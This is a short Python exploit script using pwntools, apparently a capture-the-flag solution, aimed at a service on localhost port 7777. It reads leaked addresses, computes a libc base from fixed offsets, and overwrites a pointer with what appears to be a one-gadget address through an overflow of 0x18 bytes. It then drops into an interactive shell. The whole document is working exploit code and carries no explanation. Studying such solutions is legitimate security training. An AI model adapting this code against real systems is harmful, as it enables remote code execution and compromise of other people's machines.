from pwn import *

context.arch = "amd64"

s = connect("localhost", 7777)

s.recvuntil("data[0]: 0x")
data0 = int(s.recvline()[:-1], 16)
s.recvuntil("printf: 0x")
printf = int(s.recvline()[:-1], 16)

def get(index, data):
  s.sendlineafter("> ", "%d %d"%(0, index))
  s.sendline(data)

def put(index):
  s.sendlineafter("> ", "%d %d"%(1, index))
  return s.recvline()[:-1]

libc = printf - 0x64e80
rce = libc + 0x4f322

get(2, pack(rce))
get(0, b"a"*0x18 + pack(data0 + 0x48))
get(1, "")

s.interactive()
